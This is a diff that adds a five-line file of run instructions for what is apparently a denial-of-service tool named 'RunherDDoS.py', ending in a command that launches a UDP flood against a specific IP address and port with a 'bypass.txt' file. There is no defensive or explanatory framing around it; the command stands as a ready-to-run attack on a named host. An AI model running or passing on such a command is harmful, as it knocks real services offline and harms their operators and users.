@@ -1,0 +1,5 @@
+cd
+
+pip3 install -r requirements.txt
+
+python3 RunherDDoS.py udp 20.239.168.55:7777 1 100000 bypass.txt 6500 8080
